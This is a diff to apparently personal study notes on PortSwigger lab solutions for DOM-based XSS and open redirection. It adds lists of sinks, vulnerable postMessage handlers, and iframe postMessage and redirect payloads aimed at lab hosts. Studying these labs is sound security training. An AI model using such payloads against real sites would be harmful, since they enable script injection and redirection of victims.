@@ -2673,6 +2673,23 @@ Content-Type: application/json
 - element.insertAdjacentHTML
 - element.onevent
 
+**DOM-based open-redirection vulnerabilities**
+- location
+- location.host
+- location.hostname
+- location.href
+- location.pathname
+- location.search
+- location.protocol
+- location.assign()
+- location.replace()
+- open()
+- element.srcdoc
+- XMLHttpRequest.open()
+- XMLHttpRequest.send()
+- jQuery.ajax()
+- $.ajax()
+
 **jQuery functions sinks**
 - add()
 - after()
@@ -2716,7 +2733,7 @@ https://portswigger.net/web-security/dom-based
     ```
   - Exploit server
     `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
-- DOM XSS using web messages and a JavaScript URL
+- DOM XSS using web messages and a **JavaScript URL**
   - Discover > home page > Find script > addEventListener() > The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href.
     ```
     window.addEventListener('message', function(e) {
@@ -2729,8 +2746,33 @@ https://portswigger.net/web-security/dom-based
   - Exploit server
     `iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
   - When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
-- DOM XSS using web messages and JSON.parse
+- DOM XSS using web messages and **JSON.parse**
+  -  Discover > home page > Find script > addEventListener() > This event listener expects a string that is parsed using JSON.parse()
+  -  event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.  
+     ```
+     window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+    ```
+  - Exploit
+    `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
+  - As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser.
 - DOM-based open redirection
+  - Discover > Find script > The blog post page contains the following link, which returns to the home page of the blog
+    `<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>`
+  - Append the url of explit server in blog post page
+    `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
 - DOM-based cookie manipulation
 - Exploiting DOM clobbering to enable XSS
 - Clobbering DOM attributes to bypass HTML filters  
